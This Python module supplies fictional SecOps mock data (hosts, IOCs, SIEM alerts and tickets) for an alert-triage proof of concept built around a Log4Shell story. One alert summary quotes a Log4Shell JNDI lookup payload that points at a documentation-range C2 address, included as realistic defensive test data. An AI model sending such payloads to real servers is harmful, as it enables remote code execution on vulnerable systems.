"""mockdata.world — the single-source-of-truth FICTIONAL SecOps enterprise.

.. warning::
   **This is CLEARLY-LABELED MOCK DATA for POC / testing only.** It is *not*
   real threat intelligence, *not* a real SIEM export, and describes *no* real
   company, person, host, or network. Every network artifact is drawn from the
   IANA documentation ranges reserved exactly for this purpose:

   - IPs: RFC 5737 documentation ranges ``192.0.2.0/24``, ``198.51.100.0/24``,
     ``203.0.113.0/24``.
   - Domains: ``example.test`` / ``example.com`` (RFC 6761 reserved names).
   - Hashes: syntactically valid SHA-256 (64 hex chars) but fabricated.
   - AWS account ids, if ever referenced, are the ``000000000000`` placeholder.

Why this module exists
----------------------
An alert-triage POC needs a *coherent* world to reason over: an analyst (or an
agent) should be able to take a raw SIEM alert, enrich its indicators, look up
the targeted asset, and open a ticket — and have every hop line up. Rather than
let each of the four data-plane tools (``siem_query``, ``asset_lookup``,
``enrich_ioc``, ``create_ticket``) invent its own disconnected fixtures, they
all read *this* world. That guarantees cross-tool consistency: the host an
alert names is the same host ``asset_lookup`` knows, the IP an alert carries is
the same indicator ``enrich_ioc`` scores.

The headline cross-link (the "Log4Shell story")
------------------------------------------------
One alert (``alert-1001``) is a Log4Shell (CVE-2021-44228) exploitation attempt
against ``web-01`` originating from a known-malicious command-and-control IP
(``203.0.113.66``). That single event chains cleanly across all four planes::

    SIEM alert  alert-1001  (rule "Log4Shell JNDI Exploit Attempt")
        │  src_ip = 203.0.113.66
        ▼
    IOC enrich  ioc-c2-01   (203.0.113.66, category "c2", confidence high)
        │  relates_to = web-01
        ▼
    Asset       web-01      (internet-exposed https, known_vuln CVE-2021-44228)
        │  (see tools/asset_lookup/handler.py — SAME host id + SAME CVE)
        ▼
    Ticket      created from the correlated finding (seed ids show the sequence)

Determinism
-----------
Everything here is literal Python data. There is no clock, no randomness, no
I/O. ``load_world()`` returns a fresh deep copy each call, so a caller mutating
the result can never corrupt the shared source. Same query in → same data out.

Consistency with the asset plane
---------------------------------
Hosts ``web-01`` / ``app-01`` / ``db-01`` / ``bastion-01`` reuse the exact ids
and the ``web-01`` → ``CVE-2021-44228`` fact from
``tools/asset_lookup/handler.py``. A few more hosts (``win-ws-07`` workstation,
``dc-01`` domain controller) are added here to give the triage narrative more
surface. The two modules are kept deliberately in sync; the offline test
``tests/test_mockworld.py`` asserts the Log4Shell/web-01/CVE invariant.
"""

from __future__ import annotations

import copy
from typing import Any, Dict, List

# --------------------------------------------------------------------------- #
# HOSTS                                                                        #
# --------------------------------------------------------------------------- #
# The four canonical hosts mirror tools/asset_lookup/handler.py (same ids, same
# Log4Shell fact on web-01). Their management IPs use RFC 5737 doc ranges — the
# asset tool models subnets in RFC 1918 space for topology, but the mock world
# needs concrete, obviously-fictional host IPs that alerts and IOCs can point
# at, so we use the documentation ranges consistently across every plane here.
_HOSTS: List[Dict[str, Any]] = [
    {
        "id": "web-01",
        "hostname": "web-01.example.test",
        "ip": "192.0.2.10",
        "os": "Ubuntu 22.04 LTS",
        "role": "public web server",
        "owner_team": "platform-web",
        "criticality": "high",
        "internet_exposed": True,
        # SAME fact as the asset plane: web-01's https service is Log4Shell-vuln.
        "known_vuln": True,
        "cve": "CVE-2021-44228",
    },
    {
        "id": "app-01",
        "hostname": "app-01.example.test",
        "ip": "192.0.2.20",
        "os": "Ubuntu 22.04 LTS",
        "role": "internal application tier",
        "owner_team": "platform-app",
        "criticality": "high",
        "internet_exposed": False,
        "known_vuln": False,
        "cve": None,
    },
    {
        "id": "db-01",
        "hostname": "db-01.example.test",
        "ip": "192.0.2.30",
        "os": "Ubuntu 22.04 LTS",
        "role": "crown-jewel database",
        "owner_team": "data-platform",
        "criticality": "critical",
        "internet_exposed": False,
        "known_vuln": False,
        "cve": None,
    },
    {
        "id": "bastion-01",
        "hostname": "bastion-01.example.test",
        "ip": "192.0.2.40",
        "os": "Amazon Linux 2023",
        "role": "ssh bastion / jump host",
        "owner_team": "secops",
        "criticality": "medium",
        "internet_exposed": True,
        "known_vuln": False,
        "cve": None,
    },
    {
        "id": "win-ws-07",
        "hostname": "win-ws-07.example.test",
        "ip": "198.51.100.7",
        "os": "Windows 11 Enterprise 23H2",
        "role": "employee workstation",
        "owner_team": "corp-it",
        "criticality": "low",
        "internet_exposed": False,
        "known_vuln": False,
        "cve": None,
    },
    {
        "id": "dc-01",
        "hostname": "dc-01.example.test",
        "ip": "198.51.100.10",
        "os": "Windows Server 2022",
        "role": "domain controller",
        "owner_team": "corp-it",
        "criticality": "critical",
        "internet_exposed": False,
        "known_vuln": False,
        "cve": None,
    },
]

# Set of valid host ids, used below to keep IOC/alert references honest.
_HOST_IDS = {h["id"] for h in _HOSTS}

# --------------------------------------------------------------------------- #
# IOCS                                                                         #
# --------------------------------------------------------------------------- #
# Fictional-but-well-formed indicators. IPs are RFC 5737 doc ranges, domains
# end in .test/.example, hashes are valid-length (64 hex) SHA-256 values.
# ``relates_to`` links each indicator to the host(s) it was observed against so
# enrichment can pivot straight to the asset plane. ``ioc-c2-01`` is the C2 IP
# that ties the Log4Shell alert to web-01 — the spine of the cross-link story.
_IOCS: List[Dict[str, Any]] = [
    {
        "id": "ioc-c2-01",
        "type": "ip",
        "value": "203.0.113.66",
        "first_seen": "2026-06-28T00:00:00Z",
        "threat_category": "c2",
        "confidence": "high",
        "relates_to": ["web-01"],
        "note": "Log4Shell JNDI callback / C2 endpoint (see alert-1001).",
    },
    {
        "id": "ioc-scan-01",
        "type": "ip",
        "value": "203.0.113.9",
        "first_seen": "2026-06-27T00:00:00Z",
        "threat_category": "scanner",
        "confidence": "medium",
        "relates_to": ["web-01", "bastion-01"],
        "note": "Opportunistic internet-wide port scanner.",
    },
    {
        "id": "ioc-phish-domain-01",
        "type": "domain",
        "value": "login-portal.example.test",
        "first_seen": "2026-06-29T00:00:00Z",
        "threat_category": "phishing",
        "confidence": "high",
        "relates_to": ["win-ws-07"],
        "note": "Credential-harvesting page delivered via email lure.",
    },
    {
        "id": "ioc-c2-domain-01",
        "type": "domain",
        "value": "cdn-update.example.test",
        "first_seen": "2026-06-29T12:00:00Z",
        "threat_category": "c2",
        "confidence": "medium",
        "relates_to": ["win-ws-07"],
        "note": "Beaconing domain contacted after phishing click.",
    },
    {
        "id": "ioc-mal-hash-01",
        "type": "sha256",
        # 64 hex chars — valid SHA-256 length, fabricated value.
        "value": "a" * 63 + "1",
        "first_seen": "2026-06-29T12:05:00Z",
        "threat_category": "malware",
        "confidence": "high",
        "relates_to": ["win-ws-07"],
        "note": "Second-stage loader dropped on the workstation.",
    },
    {
        "id": "ioc-mal-hash-02",
        "type": "sha256",
        "value": "b" * 62 + "02",
        "first_seen": "2026-06-30T02:00:00Z",
        "threat_category": "malware",
        "confidence": "medium",
        "relates_to": ["app-01"],
        "note": "Suspicious binary flagged by EDR on the app tier.",
    },
    {
        "id": "ioc-bruteforce-01",
        "type": "ip",
        "value": "198.51.100.200",
        "first_seen": "2026-06-30T03:00:00Z",
        "threat_category": "bruteforce",
        "confidence": "medium",
        "relates_to": ["bastion-01"],
        "note": "SSH password-spray source.",
    },
    {
        "id": "ioc-exfil-domain-01",
        "type": "domain",
        "value": "paste-drop.example.com",
        "first_seen": "2026-07-01T00:00:00Z",
        "threat_category": "exfiltration",
        "confidence": "low",
        "relates_to": ["db-01"],
        "note": "Paste site occasionally used for data staging (low signal).",
    },
    {
        "id": "ioc-tor-exit-01",
        "type": "ip",
        "value": "203.0.113.201",
        "first_seen": "2026-06-26T00:00:00Z",
        "threat_category": "anonymizer",
        "confidence": "low",
        "relates_to": ["bastion-01"],
        "note": "Tor exit node — informational only.",
    },
    {
        "id": "ioc-benign-cdn-01",
        "type": "domain",
        # Intentionally benign-looking (allowlisted CDN) so triage has a clear
        # false-positive to dismiss.
        "value": "assets.example.com",
        "first_seen": "2026-06-25T00:00:00Z",
        "threat_category": "benign",
        "confidence": "high",
        "relates_to": ["web-01"],
        "note": "Legitimate static-asset CDN; allowlisted (not a threat).",
    },
]

# Fast lookup: indicator value -> ioc record (used to validate alert src_ips).
_IOC_BY_VALUE = {i["value"]: i for i in _IOCS}

# --------------------------------------------------------------------------- #
# ALERTS / EVENTS                                                              #
# --------------------------------------------------------------------------- #
# SIEM-style events spread across a few days. Each carries an ATT&CK technique
# id and a mix of true-positive-looking and benign/false-positive signals. Any
# ``src_ip`` that is malicious is also present in _IOCS (cross-link), and every
# ``host`` names a real host. alert-1001 is the Log4Shell spine.
_ALERTS: List[Dict[str, Any]] = [
    {
        "alert_id": "alert-1001",
        "ts": "2026-06-28T14:03:11Z",
        "severity": "critical",
        "rule_name": "Log4Shell JNDI Exploit Attempt",
        "src_ip": "203.0.113.66",  # -> ioc-c2-01
        "dst_ip": "192.0.2.10",
        "host": "web-01",
        "technique": "T1190",  # Exploit Public-Facing Application
        "raw_summary": (
            "Inbound HTTP request to web-01 with JNDI lookup payload "
            "'${jndi:ldap://203.0.113.66/a}' in User-Agent; matches "
            "CVE-2021-44228 (Log4Shell) exploitation signature."
        ),
    },
    {
        "alert_id": "alert-1002",
        "ts": "2026-06-28T14:05:47Z",
        "severity": "high",
        "rule_name": "Outbound LDAP to Suspicious Host",
        "src_ip": "192.0.2.10",
        "dst_ip": "203.0.113.66",  # -> ioc-c2-01 (callback confirms exploit)
        "host": "web-01",
        "technique": "T1105",  # Ingress Tool Transfer
        "raw_summary": (
            "web-01 initiated outbound LDAP to 203.0.113.66 seconds after "
            "the Log4Shell attempt — likely successful JNDI callback."
        ),
    },
    {
        "alert_id": "alert-1003",
        "ts": "2026-06-27T09:12:00Z",
        "severity": "low",
        "rule_name": "Port Scan Detected",
        "src_ip": "203.0.113.9",  # -> ioc-scan-01
        "dst_ip": "192.0.2.10",
        "host": "web-01",
        "technique": "T1046",  # Network Service Discovery
        "raw_summary": (
            "Sequential connection attempts to 20+ ports on web-01 from "
            "203.0.113.9; consistent with opportunistic scanning."
        ),
    },
    {
        "alert_id": "alert-1004",
        "ts": "2026-06-29T10:30:22Z",
        "severity": "high",
        "rule_name": "Phishing Link Clicked",
        "src_ip": "198.51.100.7",
        "dst_ip": None,
        "host": "win-ws-07",
        "technique": "T1566",  # Phishing
        "raw_summary": (
            "win-ws-07 resolved and browsed login-portal.example.test after "
            "an emailed link; credential-harvesting page."
        ),
    },
    {
        "alert_id": "alert-1005",
        "ts": "2026-06-29T12:04:10Z",
        "severity": "high",
        "rule_name": "Malware Beacon to C2 Domain",
        "src_ip": "198.51.100.7",
        "dst_ip": None,
        "host": "win-ws-07",
        "technique": "T1071",  # Application Layer Protocol
        "raw_summary": (
            "win-ws-07 beaconing to cdn-update.example.test on a fixed "
            "interval; matches known C2 pattern."
        ),
    },
    {
        "alert_id": "alert-1006",
        "ts": "2026-06-30T03:14:59Z",
        "severity": "medium",
        "rule_name": "SSH Brute Force",
        "src_ip": "198.51.100.200",  # -> ioc-bruteforce-01
        "dst_ip": "192.0.2.40",
        "host": "bastion-01",
        "technique": "T1110",  # Brute Force
        "raw_summary": (
            "300+ failed SSH auths on bastion-01 from 198.51.100.200 in "
            "5 minutes; no successful login observed."
        ),
    },
    {
        "alert_id": "alert-1007",
        "ts": "2026-06-30T02:11:33Z",
        "severity": "medium",
        "rule_name": "EDR Suspicious Binary",
        "src_ip": None,
        "dst_ip": None,
        "host": "app-01",
        "technique": "T1059",  # Command and Scripting Interpreter
        "raw_summary": (
            "EDR on app-01 flagged an unsigned binary (sha256 "
            "bbbb...02) spawning a shell; pending review."
        ),
    },
    {
        "alert_id": "alert-1008",
        "ts": "2026-06-30T18:45:00Z",
        "severity": "critical",
        "rule_name": "Kerberoasting Detected",
        "src_ip": "198.51.100.7",
        "dst_ip": "198.51.100.10",
        "host": "dc-01",
        "technique": "T1558",  # Steal or Forge Kerberos Tickets
        "raw_summary": (
            "Anomalous volume of Kerberos service-ticket requests from "
            "win-ws-07 against dc-01; possible Kerberoasting."
        ),
    },
    {
        "alert_id": "alert-1009",
        "ts": "2026-07-01T08:20:00Z",
        "severity": "low",
        "rule_name": "Connection to Tor Exit Node",
        "src_ip": "203.0.113.201",  # -> ioc-tor-exit-01
        "dst_ip": "192.0.2.40",
        "host": "bastion-01",
        "technique": "T1090",  # Proxy
        "raw_summary": (
            "Single inbound connection to bastion-01 from Tor exit "
            "203.0.113.201; informational."
        ),
    },
    {
        "alert_id": "alert-1010",
        "ts": "2026-07-01T11:00:00Z",
        "severity": "info",
        "rule_name": "Known-Good CDN Traffic",
        "src_ip": "192.0.2.10",
        "dst_ip": None,
        "host": "web-01",
        "technique": "T1071",  # Application Layer Protocol (benign here)
        "raw_summary": (
            "web-01 fetched assets from assets.example.com (allowlisted "
            "CDN); benign — expected behavior."
        ),
        "false_positive": True,
    },
    {
        "alert_id": "alert-1011",
        "ts": "2026-07-01T13:30:00Z",
        "severity": "info",
        "rule_name": "Scheduled Backup Job",
        "src_ip": "192.0.2.30",
        "dst_ip": "192.0.2.20",
        "host": "db-01",
        "technique": "T1029",  # Scheduled Transfer (benign backup here)
        "raw_summary": (
            "Nightly db-01 -> app-01 backup transfer completed; expected "
            "maintenance window traffic."
        ),
        "false_positive": True,
    },
]

# --------------------------------------------------------------------------- #
# SEED TICKETS                                                                 #
# --------------------------------------------------------------------------- #
# Two pre-existing tickets so create_ticket can demonstrate a monotonic id
# sequence (next issued id would be SEC-1003). The open ticket points at the
# Log4Shell alert to show the intended alert->IOC->asset->ticket chain closing.
_TICKETS: List[Dict[str, Any]] = [
    {
        "ticket_id": "SEC-1001",
        "created_ts": "2026-06-25T09:00:00Z",
        "status": "closed",
        "severity": "medium",
        "title": "Investigate opportunistic port scan on web-01",
        "related_alert_ids": ["alert-1003"],
        "assigned_team": "secops",
    },
    {
        "ticket_id": "SEC-1002",
        "created_ts": "2026-06-28T14:20:00Z",
        "status": "open",
        "severity": "critical",
        "title": "Log4Shell exploitation attempt against web-01",
        "related_alert_ids": ["alert-1001", "alert-1002"],
        "assigned_team": "secops",
    },
]

# The id sequence prefix + next number, so create_ticket can extend it.
_TICKET_ID_PREFIX = "SEC-"
_TICKET_NEXT_SEQ = 1003


def load_world() -> Dict[str, Any]:
    """Return a fresh deep copy of the entire mock SecOps world.

    WHY a deep copy: this module is the single source of truth shared by every
    data-plane tool. Handing out the live lists would let one caller's mutation
    leak into another's read and silently break determinism. A copy keeps the
    source pristine while callers stay free to transform their slice.

    The returned dict is stable and self-consistent: every alert ``host``
    names a real host id, every malicious alert ``src_ip`` is present in the
    IOC set, and the Log4Shell alert (``alert-1001``) links the C2 IOC to
    ``web-01`` (which carries ``CVE-2021-44228``).
    """
    return copy.deepcopy(
        {
            "hosts": _HOSTS,
            "iocs": _IOCS,
            "alerts": _ALERTS,
            "tickets": _TICKETS,
            "ticket_sequence": {
                "prefix": _TICKET_ID_PREFIX,
                "next": _TICKET_NEXT_SEQ,
            },
        }
    )


if __name__ == "__main__":
    import json

    world = load_world()
    print(
        json.dumps(
            {
                "hosts": len(world["hosts"]),
                "iocs": len(world["iocs"]),
                "alerts": len(world["alerts"]),
                "tickets": len(world["tickets"]),
                "next_ticket": f"{_TICKET_ID_PREFIX}{_TICKET_NEXT_SEQ}",
            },
            indent=2,
        )
    )
